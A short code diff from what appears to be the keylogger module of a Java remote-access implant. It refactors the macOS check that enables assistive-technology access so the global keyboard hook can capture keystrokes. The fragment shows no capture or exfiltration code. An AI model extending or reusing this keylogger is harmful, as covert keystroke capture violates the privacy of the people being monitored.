@@ -17,8 +17,6 @@
  *******************************************************************************/
 package subterranean.crimson.permajar.stage2.modules.keylogger;
 
-
-
 import java.util.Date;
 
 import org.jnativehook.GlobalScreen;
@@ -60,8 +58,13 @@ public enum Keylogger {
 			return;
 		}
 
-		if (Platform.osx) {
+		switch (Platform.os) {
+		case DARWIN:
 			Utilities.enableAT();
+			break;
+		default:
+			break;
+
 		}
 
 		//
